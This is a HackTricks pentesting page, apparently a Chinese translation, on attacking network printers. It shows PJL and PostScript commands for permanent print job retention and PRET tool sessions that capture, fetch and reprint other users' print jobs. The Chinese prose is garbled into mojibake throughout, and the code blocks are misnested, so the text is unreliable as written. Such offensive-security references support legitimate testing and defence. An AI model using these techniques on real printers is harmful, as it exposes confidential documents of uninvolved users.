<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>


# æ‰“å°ä½œä¸šä¿ç•™

æŸäº›æ‰“å°æœºçš„å­˜å‚¨æ‰“å°ä½œä¸šå¯ä»¥é€šè¿‡WebæœåŠ¡å™¨è®¿é—®ã€‚é€šå¸¸ï¼Œæ‰“å°ä½œä¸šä¿ç•™å¿…é¡»ä¸ºç‰¹å®šæ‰“å°ä½œä¸šæ˜ç¡®æ¿€æ´»ï¼Œå¹¶ä¸”å¯ä»¥ä½¿ç”¨æ ‡å‡†PJLå‘½ä»¤æˆ–ä¸“æœ‰çš„PostScriptä»£ç å®Œæˆã€‚ç„¶åï¼Œä½œä¸šå°†ä¿ç•™åœ¨å†…å­˜ä¸­ï¼Œå¹¶ä¸”å¯ä»¥ä»æ§åˆ¶é¢æ¿é‡æ–°æ‰“å°ã€‚

## PJL

é€šè¿‡è®¾ç½®PJL HOLDå˜é‡ï¼Œå¯ä»¥ä¸ºå½“å‰æ–‡æ¡£å¯ç”¨åˆæ³•çš„æ‰“å°ä½œä¸šä¿ç•™ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
```
@PJL SET HOLD=ON
[actual data to be printed follows]
```
ä¿ç•™ä½œä¸šä¼šè¢«ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œå¹¶ä¸”å¯ä»¥ä»æ‰“å°æœºçš„æ§åˆ¶é¢æ¿é‡æ–°æ‰“å°ã€‚è¿™ä¸ªåŠŸèƒ½ç”±å¤šç§æ‰“å°æœºæ”¯æŒï¼Œä½†ä¼¼ä¹åªæœ‰ä¸€äº›Epsonè®¾å¤‡å…è®¸ä½¿ç”¨`@PJL DEFAULT HOLD=ON`è®¾ç½®æ°¸ä¹…ä½œä¸šä¿ç•™ã€‚

**å¦‚ä½•æµ‹è¯•è¿™ç§æ”»å‡»ï¼Ÿ**

ä½¿ç”¨[**PRET**](https://github.com/RUB-NDS/PRET)ä¸­çš„`hold`å‘½ä»¤åœ¨pjlæ¨¡å¼ä¸‹ï¼Œæ£€æŸ¥æ˜¯å¦å¯ä»¥è®¾ç½®æ°¸ä¹…ä½œä¸šä¿ç•™ï¼š
```
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> hold
Setting job retention, reconnecting to see if still enabled
Retention for future print jobs: OFF
```
## PostScript

PostScript æä¾›äº†ç±»ä¼¼çš„åŠŸèƒ½ï¼Œä½†è¿™äº›åŠŸèƒ½æ˜¯ç‰¹å®šäºå‹å·å’Œä¾›åº”å•†çš„ã€‚å¯¹äº HP LaserJet 4k ç³»åˆ—å’Œå„ç§ Kyocera æ‰“å°æœºï¼Œå¯ä»¥é€šè¿‡åœ¨ PostScript æ–‡æ¡£å‰æ·»åŠ ä»¥ä¸‹å‘½ä»¤æ¥å¯ç”¨æ‰“å°ä½œä¸šä¿ç•™åŠŸèƒ½ï¼š
```
<< /Collate true /CollateDetails
<< /Hold 1 /Type 8 >> >> setpagedevice
```
```markdown
è™½ç„¶ç†è®ºä¸Šå¯ä»¥ä½¿ç”¨[startjob](./#postscript-ps)æ“ä½œç¬¦æ°¸ä¹…å¯ç”¨PostScriptä½œä¸šä¿ç•™ï¼Œä½†æ˜¯CUPSä¼šåœ¨æ¯ä¸ªæ‰“å°ä½œä¸šå¼€å§‹æ—¶ä½¿ç”¨`<< /Collate false >> setpagedevice`æ˜ç¡®é‡ç½®æ­¤è®¾ç½®ã€‚ç„¶è€Œï¼Œæ”»å‡»è€…å¯ä»¥æ°¸ä¹…é‡æ–°å®šä¹‰`setpagedevice`æ“ä½œç¬¦ï¼Œä½¿å…¶å®Œå…¨ä¸èµ·ä½œç”¨ã€‚

**å¦‚ä½•æµ‹è¯•æ­¤æ”»å‡»ï¼Ÿ**

ä½¿ç”¨[**PRET**](https://github.com/RUB-NDS/PRET)ä¸­çš„`hold`å‘½ä»¤åœ¨psæ¨¡å¼ä¸‹ï¼š
```
```
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> hold
Job retention enabled.
```
# ä½œä¸šæ•è·

å¦‚ä¸Šæ‰€è¿°ï¼Œåœ¨æ‰“å°å¯¹è¯æ¡†ä¸­æ¿€æ´»ä½œä¸šä¿ç•™æ˜¯å¯èƒ½çš„ï¼Œä½†ä¸å¸¸è§ã€‚ç„¶è€Œï¼Œä½¿ç”¨PostScriptï¼Œå¯ä»¥å®Œå…¨æ§åˆ¶å½“å‰çš„æ‰“å°ä½œä¸šï¼Œå¹¶ä¸”ä½¿ç”¨[startjob](./#postscript-ps)æ“ä½œç¬¦ï¼Œç”šè‡³å¯ä»¥è·³å‡ºæœåŠ¡å™¨å¾ªç¯å¹¶è®¿é—®æœªæ¥çš„ä½œä¸šã€‚å¦‚æœä½¿ç”¨PostScriptä½œä¸ºæ‰“å°æœºé©±åŠ¨ç¨‹åºï¼Œè¿™æ ·çš„åŠŸèƒ½æœ‰æ½œåŠ›æ•è·æ‰€æœ‰æ–‡æ¡£ã€‚

## PostScript

é€šè¿‡èƒ½å¤ŸæŒ‚é’©ä»»æ„PostScriptæ“ä½œç¬¦ï¼Œå¯ä»¥æ“çºµå’Œè®¿é—®å¤–éƒ¨æ‰“å°ä½œä¸šã€‚ä¸ºäº†**è§£æå®é™…å‘é€åˆ°æ‰“å°æœºçš„æ•°æ®æµ**ï¼Œå¯ä»¥åˆ©ç”¨PostScriptè¯­è¨€çš„ä¸€ä¸ªéå¸¸é…·çš„ç‰¹æ€§ï¼šä½¿ç”¨`currentfile`æ“ä½œç¬¦å°†å…¶è‡ªå·±çš„ç¨‹åºä»£ç ä½œä¸ºæ•°æ®è¯»å–ã€‚è¿™æ ·ï¼Œæ•´ä¸ªè¦è¢«PostScriptè§£é‡Šå™¨å¤„ç†çš„æ•°æ®æµå¯ä»¥é€šè¿‡è¯»å–è®¿é—®ï¼Œå¹¶å­˜å‚¨åˆ°æ‰“å°æœºè®¾å¤‡ä¸Šçš„æ–‡ä»¶ä¸­ã€‚å¦‚æœæ‰“å°æœºä¸æä¾›æ–‡ä»¶ç³»ç»Ÿè®¿é—®ï¼Œ**æ•è·çš„æ–‡æ¡£å¯ä»¥å­˜å‚¨åœ¨å†…å­˜ä¸­**ï¼Œä¾‹å¦‚åœ¨æ°¸ä¹…PostScriptå­—å…¸ä¸­ã€‚\
ä¸€ä¸ªå®é™…é—®é¢˜æ˜¯å†³å®š**åº”è¯¥æŒ‚é’©å“ªä¸ªæ“ä½œç¬¦**ï¼Œå› ä¸ºåœ¨PostScriptè§£é‡Šå™¨å¤„ç†è¿™ä¸ªæ“ä½œç¬¦ä¹‹å‰ï¼Œä¸ä¼šè·å¾—æ•°æ®æµçš„è®¿é—®æƒé™ã€‚ç”±äºæ”»å‡»è€…å¸Œæœ›ä»ä¸€å¼€å§‹å°±æ•è·æ‰“å°ä½œä¸šï¼Œ**é‡æ–°å®šä¹‰çš„æ“ä½œç¬¦å¿…é¡»æ˜¯PostScriptæ–‡æ¡£ä¸­çš„ç¬¬ä¸€ä¸ªæ“ä½œç¬¦**ã€‚å¹¸è¿çš„æ˜¯ï¼Œæ‰€æœ‰ä½¿ç”¨CUPSæ‰“å°çš„æ–‡æ¡£éƒ½è¢«å‹ç¼©æˆä¸€ä¸ªå›ºå®šç»“æ„ï¼Œå¼€å§‹äº`currentfile /ASCII85Decode filter /LZWDecode filter cvx exec`ã€‚åŸºäºè¿™æ ·ä¸€ä¸ªå›ºå®šç»“æ„çš„å‡è®¾ï¼Œæ”»å‡»è€…å¯ä»¥ä»ä¸€å¼€å§‹å°±æ•è·æ–‡æ¡£ï¼Œå¹¶åœ¨ä¹‹åæ‰§è¡Œï¼ˆä¹Ÿå°±æ˜¯æ‰“å°ï¼‰æ–‡ä»¶ã€‚å¯¹äº**éCUPSçš„æ‰“å°ç³»ç»Ÿ**ï¼Œè¿™ç§æ”»å‡»ä¹Ÿåº”è¯¥æ˜¯å¯èƒ½çš„ï¼Œä½†æ˜¯**éœ€è¦é€‚é…æ“ä½œç¬¦**ã€‚è¯·æ³¨æ„ï¼Œä½¿ç”¨è¿™ç§æ–¹æ³•æ— æ³•æ•è·é€šå¸¸åŒ…æ‹¬ä»‹è´¨å¤§å°ã€ç”¨æˆ·å’Œä½œä¸šåç§°çš„PostScriptå¤´éƒ¨ï¼Œå› ä¸ºæˆ‘ä»¬é¦–å…ˆåœ¨å®é™…æ–‡æ¡£çš„å¼€å§‹å¤„æŒ‚é’©ã€‚å¦ä¸€ä¸ªåœ¨æ¯ä¸ªæ‰“å°ä½œä¸šå¼€å§‹æ—¶æŒ‚é’©çš„é€šç”¨ç­–ç•¥æ˜¯è®¾ç½®`BeginPage`ç³»ç»Ÿå‚æ•°ï¼Œå¦‚æœæ‰“å°æœºæ”¯æŒçš„è¯ï¼ˆå¤§å¤šæ•°æ‰“å°æœºéƒ½æ”¯æŒï¼‰ã€‚è¿™ä¸ªæ¼æ´å¯èƒ½åœ¨æ‰“å°è®¾å¤‡ä¸­å­˜åœ¨äº†å‡ åå¹´ï¼Œå› ä¸ºä»…ä»…æ˜¯æ»¥ç”¨äº†PostScriptæ ‡å‡†å®šä¹‰çš„è¯­è¨€ç»“æ„ã€‚

ä½¿ç”¨[**PRET**](https://github.com/RUB-NDS/PRET)ä¸­çš„`capture`å‘½ä»¤åœ¨psæ¨¡å¼ä¸‹ï¼š
```
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.

printer:/> capture
Print job operations:  capture <operation>
capture start   - Record future print jobs.
capture stop    - End capturing print jobs.
capture list    - Show captured print jobs.
capture fetch   - Save captured print jobs.
capture print   - Reprint saved print jobs.
printer:/> capture start
Future print jobs will be captured in memory!
printer:/> exit
```
ç°åœ¨ï¼Œæ‰“å°ä»»æ„æ–‡æ¡£ï¼ˆç¡®ä¿PRETå·²æ–­å¼€è¿æ¥ï¼Œä»¥å…é˜»å¡æ‰“å°é€šé“ï¼‰ã€‚ä¹‹åï¼Œæ‚¨å¯ä»¥åˆ—å‡ºã€è·å–æˆ–é‡æ–°æ‰“å°æ•è·çš„æ–‡æ¡£ï¼š
```
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> capture list
Free virtual memory: 16.6M | Limit to capture:  5.0M
date          size  user           jobname                 creator
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Jan 25 18:38  3.1M  -              -                       -
Jan 25 18:40  170K  -              -                       -
printer:/> capture fetch
Receiving capture/printer/690782792
3239748 bytes received.
Receiving capture/printer/690646210
174037 bytes received.
printer:/> capture print
printing...
printing...
2 jobs reprinted
printer:/> capture stop
Stopping job capture, deleting recorded jobs
```
<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼:

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
